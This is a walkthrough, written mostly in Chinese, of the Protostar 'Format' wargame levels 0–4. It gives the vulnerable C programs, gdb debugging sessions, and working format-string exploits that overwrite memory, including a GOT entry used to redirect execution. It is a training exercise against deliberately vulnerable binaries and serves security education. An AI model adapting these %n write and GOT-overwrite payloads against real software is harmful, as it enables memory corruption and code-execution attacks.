---
title: Exploit Education：Protostar - Format
---

> The levels to be exploited can be found in the /opt/protostar/bin directory.

## Format 0

> This level should be done in less than 10 bytes of input

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void vuln(char *string)
{
  volatile int target;
  char buffer[64];

  target = 0;

  sprintf(buffer, string);  // int sprintf(char *str, const char *format, ...);
  
  if(target == 0xdeadbeef) {
      printf("you have hit the target correctly :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}
```

- 首先还是测一下需要覆盖的位置

    ```bash
    $ gdb ./format0
    (gdb) set disassembly-flavor intel
    (gdb) disassemble vuln
    Dump of assembler code for function vuln:
    0x080483f4 <vuln+0>:	push   ebp
    0x080483f5 <vuln+1>:	mov    ebp,esp
    0x080483f7 <vuln+3>:	sub    esp,0x68
    0x080483fa <vuln+6>:	mov    DWORD PTR [ebp-0xc],0x0
    0x08048401 <vuln+13>:	mov    eax,DWORD PTR [ebp+0x8]
    0x08048404 <vuln+16>:	mov    DWORD PTR [esp+0x4],eax
    0x08048408 <vuln+20>:	lea    eax,[ebp-0x4c]
    0x0804840b <vuln+23>:	mov    DWORD PTR [esp],eax
    0x0804840e <vuln+26>:	call   0x8048300 <sprintf@plt>
    0x08048413 <vuln+31>:	mov    eax,DWORD PTR [ebp-0xc]
    0x08048416 <vuln+34>:	cmp    eax,0xdeadbeef
    0x0804841b <vuln+39>:	jne    0x8048429 <vuln+53>
    0x0804841d <vuln+41>:	mov    DWORD PTR [esp],0x8048510
    0x08048424 <vuln+48>:	call   0x8048330 <puts@plt>
    0x08048429 <vuln+53>:	leave  
    0x0804842a <vuln+54>:	ret    
    End of assembler dump.
    (gdb) break *0x0804840e
    (gdb) define hook-stop
    Type commands for definition of "hook-stop".
    End with a line saying just "end".
    >x/1i $eip
    >end
    (gdb) r $(cat /tmp/test)
    Starting program: /opt/protostar/bin/format0 $(cat /tmp/test)
    0x804840e <vuln+26>:	call   0x8048300 <sprintf@plt>

    Breakpoint 1, 0x0804840e in vuln (
        string=0xbffff84b "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ") at format0/format0.c:13
    13	in format0/format0.c
    (gdb) ni
    0x8048413 <vuln+31>:	mov    eax,DWORD PTR [ebp-0xc]
    15	in format0/format0.c
    (gdb) si
    0x8048416 <vuln+34>:	cmp    eax,0xdeadbeef
    0x08048416	15	in format0/format0.c
    (gdb) info registers 
    eax            0x51515151	1364283729  # Q
    ...
    ```

- `sprintf` 并不会检查格式字符串需要的参数与实际提供的参数是否匹配，只是根据格式字符串从栈中取参数

### Exploit

```py
import struct
target = struct.pack('I', 0xdeadbeef)
print '%64s' + target
```

```bash
$ ./format0 $(python /tmp/format.py)
you have hit the target correctly :)
```

## Format 1

> modify arbitrary memory locations

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void vuln(char *string)
{
  printf(string);
  
  if(target) {
      printf("you have modified the target :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}
```

- `printf` 与 `sprintf` 类似，只是根据格式字符串从栈中取参数
    - 可用于查看内存信息

> man 3 printf
> 
> Code such as printf(foo); If foo comes from untrusted user input, it may contain %n, causing the printf() call to write to memory and creating a security hole.

- `%n` 用于将先前已经打印的字符数量存储于指针指向的整型变量
- 获取变量 `target` 的地址

    ```bash
    $ objdump -t format1 | grep target
    08049638 g     O .bss	00000004              target
    ```

- 函数参数将压入栈中，若 `08049638` 无法直接在栈上找到，可以通过传参控制
- 不同长度的传参也影响着栈，需要尝试不同的长度使得 ESP 与字符串起始地址的差值为 $4$ 的倍数，从而能恰好读到 `08049638`

    ```bash
    $ gdb ./format1
    (gdb) set disassembly-flavor intel
    (gdb) disassemble main
    Dump of assembler code for function main:
    0x0804841c <main+0>:	push   ebp
    0x0804841d <main+1>:	mov    ebp,esp
    0x0804841f <main+3>:	and    esp,0xfffffff0
    0x08048422 <main+6>:	sub    esp,0x10
    0x08048425 <main+9>:	mov    eax,DWORD PTR [ebp+0xc]
    0x08048428 <main+12>:	add    eax,0x4
    0x0804842b <main+15>:	mov    eax,DWORD PTR [eax]
    0x0804842d <main+17>:	mov    DWORD PTR [esp],eax
    0x08048430 <main+20>:	call   0x80483f4 <vuln>
    0x08048435 <main+25>:	leave  
    0x08048436 <main+26>:	ret    
    End of assembler dump.
    (gdb) break *0x08048430
    Breakpoint 1 at 0x8048430: file format1/format1.c, line 19.
    (gdb) disassemble vuln
    Dump of assembler code for function vuln:
    0x080483f4 <vuln+0>:	push   ebp
    0x080483f5 <vuln+1>:	mov    ebp,esp
    0x080483f7 <vuln+3>:	sub    esp,0x18
    0x080483fa <vuln+6>:	mov    eax,DWORD PTR [ebp+0x8]
    0x080483fd <vuln+9>:	mov    DWORD PTR [esp],eax
    0x08048400 <vuln+12>:	call   0x8048320 <printf@plt>
    0x08048405 <vuln+17>:	mov    eax,ds:0x8049638
    0x0804840a <vuln+22>:	test   eax,eax
    0x0804840c <vuln+24>:	je     0x804841a <vuln+38>
    0x0804840e <vuln+26>:	mov    DWORD PTR [esp],0x8048500
    0x08048415 <vuln+33>:	call   0x8048330 <puts@plt>
    0x0804841a <vuln+38>:	leave  
    0x0804841b <vuln+39>:	ret    
    End of assembler dump.
    (gdb) break *0x08048400
    Breakpoint 2 at 0x8048400: file format1/format1.c, line 10.
    (gdb) define hook-stop
    >x/1i $eip
    >end
    ```

    ??? note "'%x' * 10"

        ```bash
        (gdb) r "`python -c "print('%x' * 10)"`"
        Starting program: /opt/protostar/bin/format1 "`python -c "print('%x' * 10)"`"
        0x8048430 <main+20>:	call   0x80483f4 <vuln>

        Breakpoint 1, 0x08048430 in main (argc=2, argv=0xbffff744) at format1/format1.c:19
        19	in format1/format1.c
        (gdb) x/wx $esp
        0xbffff680:	0xbffff89f
        (gdb) c
        Continuing.
        0x8048400 <vuln+12>:	call   0x8048320 <printf@plt>

        Breakpoint 2, 0x08048400 in vuln (string=0xbffff89f "%x%x%x%x%x%x%x%x%x%x")
            at format1/format1.c:10
        10	in format1/format1.c
        (gdb) x/10wx $esp
        # (0xbffff89f - 0xbffff660) % 4 = 3
        0xbffff660:	0xbffff89f	0x0804960c	0xbffff698	0x08048469
        0xbffff670:	0xb7fd8304	0xb7fd7ff4	0xbffff698	0x08048435
        0xbffff680:	0xbffff89f	0xb7ff1040
        (gdb) c
        Continuing.
        804960cbffff6988048469b7fd8304b7fd7ff4bffff6988048435bffff89fb7ff1040804845b
        Program exited normally.
        ```

    ??? note "'%x ' * 10"

        ```bash
        (gdb) r "`python -c "print('%x ' * 10)"`"
        Starting program: /opt/protostar/bin/format1 "`python -c "print('%x ' * 10)"`"
        0x8048430 <main+20>:	call   0x80483f4 <vuln>

        Breakpoint 1, 0x08048430 in main (argc=2, argv=0xbffff734) at format1/format1.c:19
        19	in format1/format1.c
        (gdb) x/wx $esp
        0xbffff670:	0xbffff895
        (gdb) c
        Continuing.
        0x8048400 <vuln+12>:	call   0x8048320 <printf@plt>

        Breakpoint 2, 0x08048400 in vuln (string=0xbffff895 "%x %x %x %x %x %x %x %x %x %x ")
            at format1/format1.c:10
        10	in format1/format1.c
        (gdb) x/16wx $esp
        0xbffff650:	0xbffff895	0x0804960c	0xbffff688	0x08048469
        0xbffff660:	0xb7fd8304	0xb7fd7ff4	0xbffff688	0x08048435
        0xbffff670:	0xbffff895	0xb7ff1040	0x0804845b	0xb7fd7ff4
        0xbffff680:	0x08048450	0x00000000	0xbffff708	0xb7eadc76
        (gdb) c
        Continuing.
        804960c bffff688 8048469 b7fd8304 b7fd7ff4 bffff688 8048435 bffff895 b7ff1040 804845b 
        Program exited normally.
        ```

### Exploit

```bash
$ ./format1 "$(python -c "print 'A' * 4 + '\x38\x96\x04\x08' + 'B' * 7 + '%x' * 135 + '%n'")"
AAAA8BBBBBBB804960cbffff5d88048469b7fd8304b7fd7ff4bffff5d88048435bffff7bcb7ff1040804845bb7fd7ff480484500bffff658b7eadc762bffff684bffff690b7fe1848bffff640ffffffffb7ffeff4804824d1bffff640b7ff0626b7fffab0b7fe1b28b7fd7ff400bffff658e8c9752abb7f65000280483400b7ff6210b7eadb9bb7ffeff42804834008048361804841c2bffff68480484508048440b7ff1040bffff67cb7fff8f82bffff7b2bffff7bc0bffff8dcbffff8f1bffff908bffff920bffff92ebffff942bffff963bffff97abffff98dbffff997bffffe87bffffea0bffffedebffffef2bfffff10bfffff27bfffff38bfffff53bfffff5bbfffff6bbfffff78bfffffacbfffffc0bfffffd4bfffffe6020b7fe241421b7fe200010178bfbbf61000116438048034420577b7fe30008098048340b3e9c0d3e9e3e917119bffff79b1fbffffff2fbffff7ab00120000008433fc8b69057f81755be21d6923a08e3638362f2e00006d726f6631746141414141you have modified the target :)
```

## Format 2

> how specific values can be written in memory

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin); // char *fgets(char *s, int size, FILE *stream);
  printf(buffer);
  
  if(target == 64) {
      printf("you have modified the target :)\n");
  } else {
      printf("target is %d :(\n", target);
  }
}

int main(int argc, char **argv)
{
  vuln();
}
```

- 变量 `target` 对应的地址

    ```bash
    $ objdump -t format2 | grep target
    080496e4 g     O .bss	00000004              target
    ```

- 观察输入字符串在栈中的位置

    ```bash
    $ python -c "print('%x ' * 20)" | ./format2
    200 b7fd8420 bffff514 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 b7ff000a 0 
    target is 0 :(
    ```

- 通过 `%x` 从栈中取参数直到读到目标 `080496e4`，设需要 `%x`（占 $2$ 个字节） 的数量为 $x$，$2x/4 + 3 = x$ 解得 $x=6$
    - 在 `%n` 前需打印 $64$ 个字符，通过 `%x` 共计打印 $6 \times 8 - 5 = 43$ 个字符，加上 `\xe4\x96\x04\x08`，还需再补充 $17$ 个字符
- 当然，可以简单地通过 `$` 来决定取第几个参数

### Exploit

```bash
$ python -c "print('%x' * 6 + '\xe4\x96\x04\x08' + 'A' * 17 + '%n')" | ./format2
200b7fd8420bffff514782578257825782578257825AAAAAAAAAAAAAAAAA
you have modified the target :)
# Simple Version
$ python -c "print('\xe4\x96\x04\x08' + 'A' * 60 + '%4\$n')" | ./format2
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
you have modified the target :)
```

## Format 3

> how to write more than 1 or 2 bytes of memory to the process

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void printbuffer(char *string)
{
  printf(string);
}

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printbuffer(buffer);
  
  if(target == 0x01025544) {
      printf("you have modified the target :)\n");
  } else {
      printf("target is %08x :(\n", target);
  }
}

int main(int argc, char **argv)
{
  vuln();
}
```

- 变量 `target` 对应的地址

    ```bash
    $ objdump -t format3 | grep target
    080496f4 g     O .bss	00000004              target
    ```

- 观察输入字符串在栈中的位置

    ```bash
    $ python -c "print('%x ' * 20)" | ./format3
    0 bffff4d0 b7fd7ff4 0 0 bffff6d8 804849d bffff4d0 200 b7fd8420 bffff514 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 
    target is 00000000 :(
    ```

- `target` 的目标值为 `0x01025544`，而输入限制长度为 `512` 字符，可以通过设置输出最小宽度来补足字符

### Exploit

```bash
$ python -c "print('\xf4\x96\x04\x08' + '%16930112x' + '%12\$n')" | ./format3
...
                                0
you have modified the target :)
```

## Format 4

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void hello()
{
  printf("code execution redirected! you win\n");
  _exit(1);
}

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printf(buffer);

  exit(1);
}

int main(int argc, char **argv)
{
  vuln();
}
```

- 获取 `hello` 函数的地址

    ```bash
    $ objdump -t format4 | grep hello
    080484b4 g     F .text	0000001e              hello
    $ gdb ./format4
    (gdb) x hello
    0x80484b4 <hello>:	0x83e58955
    ```

- 获取 GOT 表 `exit` 函数的条目地址

    ```bash
    (gdb) set disassembly-flavor intel
    (gdb) disassemble vuln
    Dump of assembler code for function vuln:
    0x080484d2 <vuln+0>:	push   ebp
    0x080484d3 <vuln+1>:	mov    ebp,esp
    0x080484d5 <vuln+3>:	sub    esp,0x218
    0x080484db <vuln+9>:	mov    eax,ds:0x8049730
    0x080484e0 <vuln+14>:	mov    DWORD PTR [esp+0x8],eax
    0x080484e4 <vuln+18>:	mov    DWORD PTR [esp+0x4],0x200
    0x080484ec <vuln+26>:	lea    eax,[ebp-0x208]
    0x080484f2 <vuln+32>:	mov    DWORD PTR [esp],eax
    0x080484f5 <vuln+35>:	call   0x804839c <fgets@plt>
    0x080484fa <vuln+40>:	lea    eax,[ebp-0x208]
    0x08048500 <vuln+46>:	mov    DWORD PTR [esp],eax
    0x08048503 <vuln+49>:	call   0x80483cc <printf@plt>
    0x08048508 <vuln+54>:	mov    DWORD PTR [esp],0x1
    0x0804850f <vuln+61>:	call   0x80483ec <exit@plt>
    End of assembler dump.
    (gdb) disassemble 0x80483ec
    Dump of assembler code for function exit@plt:
    0x080483ec <exit@plt+0>:	jmp    DWORD PTR ds:0x8049724
    0x080483f2 <exit@plt+6>:	push   0x30
    0x080483f7 <exit@plt+11>:	jmp    0x804837c
    End of assembler dump.
    (gdb) x 0x8049724
    0x8049724 <_GLOBAL_OFFSET_TABLE_+36>:	0x080483f2
    ```

- 测试覆盖 `exit` 函数 GOT 表条目跳转 `hello` 函数的可行性

    ```bash
    (gdb) break *0x08048508
    Breakpoint 1 at 0x8048508: file format4/format4.c, line 22.
    (gdb) r
    Starting program: /opt/protostar/bin/format4 
    Test input
    Test input

    Breakpoint 1, vuln () at format4/format4.c:22
    22	format4/format4.c: No such file or directory.
      in format4/format4.c
    (gdb) set {int}0x8049724=0x80484b4
    (gdb) x 0x8049724
    0x8049724 <_GLOBAL_OFFSET_TABLE_+36>:	0x080484b4
    (gdb) c
    Continuing.
    code execution redirected! you win

    Program exited with code 01.
    ```

- 观察输入字符串在栈中的位置

    ```bash
    $ python -c "print('%x ' * 20)" | ./format4
    200 b7fd8420 bffff524 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 b7ff000a 0
    ```

- `0x080484b4` 较大，直接通过设置输出最小宽度来补足字符的话打印会消耗较长时间，可以拆分成两部分进行修改
    - 实际每次修改 $4$ 字节

### Exploit

```py
import struct

exit_got = 0x08049724
exploit = ''
exploit += struct.pack('I', exit_got)
exploit += struct.pack('I', exit_got + 2)
exploit += '%33964x' # 0x84b4 - 8
exploit += '%4$n'
exploit += '%33616x' # 0x10804 - 0x84b4
exploit += '%5$n'
print exploit
```

```bash
$ python /tmp/format.py | ./format4
...
     b7fd8420
code execution redirected! you win
```